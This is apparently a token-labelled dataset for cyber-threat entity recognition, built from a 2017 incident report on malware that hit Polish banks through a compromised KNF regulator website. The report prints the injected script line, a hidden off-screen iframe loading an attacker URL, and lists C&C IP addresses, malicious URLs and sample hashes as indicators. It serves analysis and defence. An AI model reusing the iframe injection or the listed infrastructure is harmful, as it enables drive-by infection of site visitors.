Several Polish banks hacked, information stolen by unknown attackers .		others location industry others others others others others others person others
Release_Time : 2017-02-03 Report_URL : https://badcyber.com/several-polish-banks-hacked-information-stolen-by-unknown-attackers/ Polish banks are frantically scanning their workstations and servers while checking logs in the search of signs of infection after some of them noticed unusual network activity and unauthorised files on key machines within their networks .		others others others others others others others others location industry others others others others others others others others others others others others others others others others others others others others others others attack_activity attack_activity attack_activity others others others others others others others others others others
This is – by far – the most serious information security incident we have seen in Poland .		reference_word others others others others others others others others others others others others others others others location others
It has been a busy week in SOCs all over Polish financial sector .		others others others others others others others security_team others others location others others others
At least a few of Polish 20-something commercial banks have already confirmed being victims of a malware infection while others keep looking .		others others others others others location others industry industry others others others others others others others malware others others others others others others
Network traffic to exotic locations and encrypted executables nobody recognised on some servers were the first signs of trouble .		others others others others others others others others others others others others others others others others others others others others
A little more than a week ago one of the banks detected strange malware present in a few workstations .		others others others others time time time others others others industry others others malware others others others others others others
Having established basic indicators of compromise managed to share that information with other banks , who started asking their SIEMs for information .		others others others others others others others others others others others others others industry others others others others others security_team others others others
In some cases the results came back positive .		others others others others others others others others others
Preliminary investigation suggests that the starting point for the infection could have been located on the webserver of Polish financial sector regulatory body , Polish Financial Supervision Authority ( www.knf.gov.pl ).Due to a slight modification of one of the local JS files , an external JS file was loaded , which could have executed malicious payloads on selected targets .		others others others others others others others others others others others others others others others others others others location others others others others others location government government government others url others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
This would be really ironic if the website of the key institution responsible for assuring proper security level in the banking sector was used to attack it .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others
Data from PassiveTotal does confirm the finding related to external resources included in knf.gov.pl website since 2016-10-07 till yesterday .		others others tool others others others others others others others others others others url others others time others time others
To unauthorised code was located in the following file :  http://www.knf.gov.pl/DefaultDesign/Layouts/KNF2013/resources/accordian-src.js?ver=11 .		others others others others others others others others others others url_evil url_evil url_evil url_evil others others
and looked like that :  document.write ("<div id='efHpTk' width='0px' height='0px'><iframe name='forma' src='https://sap.misapor.ch/vishop/view.jsp?pagenum=1' width='145px' height='146px' style='left : -2144px ; position : absolute ; top : 0px ; '></iframe></div>" ) ;  After successful exploitation malware was downloaded to the workstation , where , once executed , connected to some foreign servers and could be used to perform network reconnaissance , lateral movement and data exfiltration .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others malware others others others others others others others others others others others others others others attack_goal attack_goal others others others others others others others others others others others others others others others
At least in some cases the attackers managed to gain control over key servers within bank infrastructure .		others others others others others others person others others others others others others others others attack_goal attack_goal others
While you can find some hashes at the end of this article , we gathered the available information regarding the malware itself .		others others others others others others others others others others others others others others others others others others others others others others others
While there might be some elements borrowed from other similar tools and crimeware strategies , the malware used in this attack has not been documented before .		others others others others others others others others others others others others others others others others others others others others others others others others others others others
It uses some commercial packers and multiple obfuscation methods , has multiple stages , relies on encryption and at the moment of initial analysis was not recognised by available AV solutions .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
The final payload has the functionality of a regular RAT .		others others others others others others others others others others others
While we have no idea of attackers motivation , so far we have no knowledge of any direct financial losses incurred by banks or their customers due to this attack .		others others others others others others person others others others others others others others others others others others others others others others industry others others others others others others others others
What is more troubling , some of the victims were able to identify large outgoing data transfers .		others others others others others others others others others others others others others others others others others others
So far they could not identify the contents of the data as it was encrypted .		others others others others others others others others others others others others others others others others
Investigation continues to fully understand the scope of losses .		others others others others others others others others others others
While this should not come as a surprise , this incident is the perfect example of the statement “ you are going to get infected ” .		others others others others others others others others others others others others others others others others others others others others others others others others others others others
Polish financial sector has some of the best people and tools in terms of security and still it looks like the attackers achieved their objectives without major hurdles in at least some cases .		location industry industry others others others others others others others others others others others others others others others others others others person others others others others others others others others others others others others
On the good side – they were detected and once notified banks were able to quickly identify infected machines and suspicious traffic patterns .		others others others others others reference_word others others others others others industry others others others others counter_measure counter_measure counter_measure counter_measure counter_measure counter_measure counter_measure others
The whole process lacked solid information sharing , but this is a problem know  everywhere .		others others others others others others others others others others others others others others others others
We hope to continue investigating this incident and share with you more details about the malware itself in the future .		others others others others others others others others others others others others others others others others others others others others others
Meanwhile please find attached some IOCs we can share today :  MD5 , SHA1 , SHA256 hashes of some samples :  C1364BBF63B3617B25B58209E4529D8C  85D316590EDFB4212049C4490DB08C4B  1BFBC0C9E0D9CEB5C3F4F6CED6BCFEAE .		others others others others others others others others others others others others others others others others others others others others others md5 md5 md5 others
496207DB444203A6A9C02A32AFF28D563999736C  4F0D7A33D23D53C0EB8B34D102CDD660FC5323A2  BEDCEAFA2109139C793CB158CEC9FA48F980FF2B .		sha1 sha1 sha1 others
FC8607C155617E09D540C5030EABAD9A9512F656F16B38682FD50B2007583E9B  D4616F9706403A0D5A2F9A8726230A4693E4C95C58DF5C753CCC684F1D3542E2  CC6A731E9DAFF84BAE4214603E1C3BAD8D6735B0CBB2A0EC1635B36E6A38CB3A .		sha2 sha2 sha2 others
Some C&C IP addresses :  125.214.195.17 .		others others others others others others others IP_evil others
196.29.166.218 .		IP_evil others
Potentially malicious URLs included in knf.gov.pl website :  http://sap.misapor.ch/vishop/view.jsp?pagenum=1 .		others others others others others others others others url_evil url_evil url_evil url_evil url_evil others
https://www.eye-watch.in/design/fancybox/Pnf.action .		url_evil url_evil url_evil others
